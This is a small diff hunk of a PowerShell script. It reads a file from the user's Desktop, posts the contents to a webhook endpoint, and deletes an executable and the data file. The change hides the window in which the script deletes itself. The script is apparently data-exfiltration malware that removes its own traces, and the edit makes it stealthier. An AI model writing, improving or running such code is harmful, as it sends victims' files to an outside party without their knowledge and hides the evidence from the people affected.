@@ -8,4 +8,4 @@ $payload = @{ content = [IO.File]::ReadAllText("$HOME\Desktop\_") };
 Invoke-RestMethod -URI ($webhook + "aq0yM6LQaDCkvYfwoh7ZmlSGP2nQu8wm2jTCreFBKAxY") -Method Post -Body $payload;
 Remove-Item -Path "$HOME\Desktop\p.exe";
 Remove-Item -Path "$HOME\Desktop\_";
-Start PowerShell {"Remove-Item -Path $HOME\Desktop\b.ps1"};
+Start PowerShell -windowStyle hidden {"Remove-Item -Path $HOME\Desktop\b.ps1"};
